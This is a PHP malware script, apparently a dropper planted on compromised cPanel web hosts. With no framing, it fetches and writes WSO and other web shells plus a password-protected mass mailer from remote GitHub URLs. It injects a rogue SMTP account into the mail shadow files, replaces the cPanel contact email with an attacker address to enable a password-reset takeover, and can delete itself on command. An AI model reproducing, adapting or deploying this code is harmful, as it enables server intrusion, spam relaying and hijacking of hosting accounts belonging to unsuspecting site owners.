<?php
print("<version><center>V323MIX V1.0</version></center>\n");
@error_reporting(0);
@set_time_limit(0);
@clearstatcache();
@ini_set('error_log', NULL);
@ini_set('log_errors', 0);
@ini_set('display_errors', 0);
if (isset($_GET["jib"]) && $_GET["jib"] == "lkar")
{
    print("G00D-By3");
    unlink(__FILE__);
}

function get_contents($url)
{
    $ch = curl_init("$url");
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0(Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
    curl_setopt($ch, CURLOPT_COOKIEJAR, $GLOBALS['coki']);
    curl_setopt($ch, CURLOPT_COOKIEFILE, $GLOBALS['coki']);
    $result = curl_exec($ch);
    return $result;
}
if ($_GET["jib"] == "l9wada")
{
    $htaccess = "https://raw.githubusercontent.com/3MiR4/L3IBAT/main/wso744.php";
    //$f = 'file_';
    $g = 'get_';
    $c = 'contents';
    $fun = $g . $c;
    $file = $fun($htaccess);
    $ra = rand(100, 1000000);
    $open = fopen("wso-" . $ra . ".php", 'w');
    fwrite($open, $file);
    fclose($open);
    $site = $_SERVER['HTTP_HOST'];
    if ($open)
    {
        echo "<shell>http://$site/wso-$ra.php</shell><br>";
    }
    else
    {
        echo "<br>[-] Error [-]<br>";
    }

    $htaccess21 = "https://raw.githubusercontent.com/3MiR4/L3IBAT/main/winxo774.php";
    //$f = 'file_';
    $g = 'get_';
    $c = 'contents';
    $fun = $g . $c;
    $file = $fun($htaccess21);
    $ra = rand(100, 1000000);
    $open = fopen("winxo-" . $ra . ".php", 'w');
    fwrite($open, $file);
    fclose($open);
    $site = $_SERVER['HTTP_HOST'];
    if ($open)
    {
        echo "<winxo>http://$site/winxo-$ra.php</winxo><br>";
    }
    else
    {
        echo "<br>[-] Error [-]<br>";
    }
    $cgi = "https://raw.githubusercontent.com/3Mi7/STR7/main/ezleaf-873716.php";
    $file = $fun($cgi);
    $ra = rand(100, 1000000);
    $open = fopen("leaf-" . $ra . ".php", 'w');
    fwrite($open, $file);
    fclose($open);
    $site = $_SERVER['HTTP_HOST'];
    if ($open)
    {
        echo "<mailer>http://$site/leaf-$ra.php?pass=3mixs3113r134x</mailer><br>";
    }
    else
    {
        echo "<br>[-] Error [-]<br>";
    }
    $pwd = @getcwd();
    if (!function_exists('posix_getegid'))
    {
        $usr = @get_current_user();
        $uid = @getmyuid();
        $gid = @getmygid();
        $group = "?";
    }
    else
    {
        $uid = @posix_getpwuid(posix_geteuid());
        $gid = @posix_getgrgid(posix_getegid());
        $usr = $uid['name'];
        $uid = $uid['uid'];
        $group = $gid['name'];
        $gid = $gid['gid'];
    }
    if (empty($usr))
    {
        if (preg_match_all("#/home/(.*)/public_html/#", $pwd, $mxx))
        {
            preg_match_all("#/home/(.*)/public_html/#", $pwd, $mxx);
            $usr = $mxx[1][0];
        }
    }
    preg_match_all("#/home(.*)$usr/#", $pwd, $m2);
    $home = $m2[1][0];
    $domain = $_SERVER['HTTP_HOST'];
    $ip = $_SERVER["SERVER_ADDR"];
    if (strstr($domain, 'www.'))
    {
        $domain = str_replace("www.", "", $domain);
    }
    else
    {
        $domain = $domain;
    }
    $cp = "/home$home$usr/.cpanel";
    if (is_dir($cp))
    {
        $pass = "KRYPTO-" . substr(str_shuffle("123456789abcdefghijklmnopqrsyuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ") , 50) . "-MAD";
        $pwd = crypt($pass, '$6$roottn$');
        $smtpname = 'webinar';
        @mkdir("/home$home$usr/etc/$domain");
        @mkdir("/home$home$usr/mail/$domain");
        @mkdir("/home$home$usr/mail/$domain/$smtpname");
        @mkdir("/home$home$usr/mail/$domain/$smtpname/.Archive");
        @mkdir("/home$home$usr/mail/$domain/$smtpname/.Drafts");
        @mkdir("/home$home$usr/mail/$domain/$smtpname/.Sent");
        @mkdir("/home$home$usr/mail/$domain/$smtpname/.spam");
        @mkdir("/home$home$usr/mail/$domain/$smtpname/.Trash");
        @mkdir("/home$home$usr/mail/$domain/$smtpname/cur");
        @mkdir("/home$home$usr/mail/$domain/$smtpname/new");
        @mkdir("/home$home$usr/mail/$domain/$smtpname/tmp");
        $file1 = "/home$home$usr/mail/$domain/$smtpname/dovecot-acl-list";
        fwrite(fopen($file1, "a") , '');
        $file2 = "/home$home$usr/mail/$domain/$smtpname/dovecot-uidlist";
        fwrite(fopen($file2, "w") , '3 V1578724087 N1 G6789ba31f76a195e040b0000cb0407e2');
        $file3 = "/home$home$usr/mail/$domain/$smtpname/dovecot-uidvalidity";
        fwrite(fopen($file3, "w") , '5e196afc0');
        $file4 = "/home$home$usr/mail/$domain/$smtpname/dovecot-uidvalidity.5e196afc";
        fwrite(fopen($file4, "a") , '');
        $file5 = "/home$home$usr/mail/$domain/$smtpname/dovecot.index.log";
        fwrite(fopen($file5, "a") , '');
        $file6 = "/home$home$usr/mail/$domain/$smtpname/dovecot.list.index.log";
        fwrite(fopen($file6, "a") , '');
        $file7 = "/home$home$usr/mail/$domain/$smtpname/dovecot.mailbox.log";
        fwrite(fopen($file7, "a") , '');
        $file8 = "/home$home$usr/mail/$domain/$smtpname/maildirsize";
        fwrite(fopen($file8, "w") , "2147483647C\n0 0");
        $file9 = "/home$home$usr/mail/$domain/$smtpname/subscriptions";
        fwrite(fopen($file9, "w") , "V	2\n\nArchive\nDrafts\nSent\nspam\nTrash");
        $smtp = $smtpname . ':' . $pwd . ':16249:::::' . "\r\n";
        $shadow1 = "/home$home$usr/etc/$domain/shadow";
        $shadow2 = "/home$home$usr/etc/shadow";
        $shadow1_content = file_get_contents($shadow1);
        $shadow2_content = file_get_contents($shadow2);
        if (preg_match("/$smtpname/", $shadow1_content))
        {
            $pathe_msg = "/home$home$usr/mail/$domain/$smtpname/new";
            $scan_msg = scandir($pathe_msg);
            foreach ($scan_msg as $file_msg)
            {
                unlink("$pathe_msg/$file_msg");
            }
            unlink($shadow1);
        }
        if (preg_match("/$smtpname/", $shadow2_content))
        {
            unlink($shadow2);
        }
        $fo = fopen($shadow1, "a");
        fwrite($fo, $smtp);
        $fo2 = fopen($shadow2, "a");
        fwrite($fo2, $smtp);
        echo "<smtp>$domain|587|$smtpname@$domain|$pass</smtp><br>";
        $path = "/var/cpanel/users/$usr";
        $limit = file_get_contents($path);
        preg_match_all("/MAX_EMAIL_PER_HOUR=(.*)/", $limit,$out);
        print_r($out[0][0]);
    }
    $user = get_current_user();
    $site = $_SERVER['HTTP_HOST'];
    $ips = getenv('REMOTE_ADDR');
    $wr = 'email: handshake-0x01@outlook.com';
    $f = fopen('/home/'.$user.'/.cpanel/contactinfo', 'w');
    fwrite($f, $wr); 
    fclose($f);
    $f = fopen('/home/'.$user.'/.contactinfo', 'w');
    fwrite($f, $wr); 
    fclose($f);
    $parm = 'https://'.$site.':2083/resetpass?start=1';
    echo "<cpanel><a href=$parm><center>3iwww<b><h3></a></center></cpanel>";
    echo "<user><center>\n USER :D ==> $user</h3></b></center></user>";
}
?>
